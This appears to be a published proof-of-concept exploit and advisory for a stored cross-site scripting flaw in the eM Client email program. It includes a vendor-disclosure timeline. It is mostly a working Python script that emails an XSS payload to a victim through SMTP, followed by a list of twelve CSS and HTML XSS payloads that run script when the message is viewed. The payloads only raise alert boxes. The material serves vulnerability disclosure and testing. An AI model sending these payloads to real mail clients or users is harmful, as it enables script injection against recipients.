#!/usr/bin/python
'''

Author: loneferret of Offensive Security
Date: 22-08-2013
Product: eM Client for Windows
Version: 5.0.18025.0 (previous versions and other platforms may be vulnerable)
Vendor Site: http://www.emclient.com/
Software Download: http://www.emclient.com/download

Tested on: Windows XP Pro SP3 Eng.
Tested on: Windows 7 Pro SP1 Eng.
eM Client: Using default settings


E-mail client is vulnerable to stored XSS. Either opening or viewing the e-mail and you 
get an annoying alert box etc etc etc.
Injection Point:  Body
 
Gave vendor 7 days to reply in order to co-ordinate a release date. 
Timeline:
23 Aug 2013: Tentative release date 30 Aug 2013
23 Aug 2013: Vulnerability reported to vendor. Provided a list of payloads
26 Aug 2013: No response from vendor, sent a reminder email
27 Aug 2013: Vendor responded, will issue update to fix within 14 days
27 Aug 2013: Tentative release date pushed to September 10th 2013
27 Aug 2013: Replied to vendor with new date
09 Sep 2013: Contacted vendor with remainder of release date
09 Sep 2013: Vendor responded with go ahead with release
10 Sep 2013: Public release

'''

import smtplib, urllib2

payload = '''<DIV STYLE="background-image: url(javascript:alert('XSS'))">'''

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@offsec.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS payload\n"
        msg += "Content-type: text/html\n\n"
        msg += payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "test@test.com"
password = "123456"
dstemail = "test@test.com"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.61.165"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)

'''
# Payloads
[+] Payload 1 : DIV background-image 1
[+] Code for 1 : <DIV STYLE="background-image: url(javascript:alert('XSS'))">
------------
[+] Payload 2 : DIV background-image 2
[+] Code for 2 : <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
------------
[+] Payload 3 : DIV expression
[+] Code for 3 : <DIV STYLE="width: expression(alert('XSS'));">
------------
[+] Payload 4 : IMG STYLE w/expression
[+] Code for 4 : exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
------------
[+] Payload 5 : List-style-image
[+] Code for 5 : <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
------------
[+] Payload 6 : STYLE w/Comment
[+] Code for 6 : <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
------------
[+] Payload 7 : STYLE w/Anonymous HTML
[+] Code for 7 : <XSS STYLE="xss:expression(alert('XSS'))">
------------
[+] Payload 8 : STYLE w/background-image
[+] Code for 8 : <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
------------
[+] Payload 9 : TABLE
[+] Code for 9 : <TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
------------
[+] Payload 10 : TD
[+] Code for 11 : <TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
------------
[+] Payload 12 : Commented-out Block
[+] Code for 12 : <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
----
'''